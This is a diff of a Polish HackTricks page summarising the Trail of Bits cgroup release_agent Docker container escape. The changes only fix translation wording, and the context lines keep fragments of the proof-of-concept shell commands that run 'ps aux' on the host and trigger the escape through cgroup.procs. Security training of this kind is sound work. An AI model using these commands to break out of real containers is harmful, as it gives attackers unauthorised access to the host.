@@ -2,7 +2,7 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-**Aby uzyskać więcej szczegółów, zapoznaj się z** [**oryginalnym wpisem na blogu**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** To jest tylko podsumowanie:
+**Aby uzyskać więcej szczegółów, zapoznaj się z** [**oryginalnym wpisem na blogu**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** To tylko podsumowanie:
 
 Original PoC:
 ```shell
@@ -41,7 +41,7 @@ echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
 ```
 5. **Wyzwól Atak:**
-- Proces jest inicjowany w "x" dziecinnym cgroup i natychmiast kończony.
+- Proces jest inicjowany w "x" cgroup dziecka i natychmiast kończony.
 - To wyzwala `release_agent` (skrypt /cmd), który wykonuje ps aux na hoście i zapisuje wynik do /output w kontenerze.
 ```shell
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
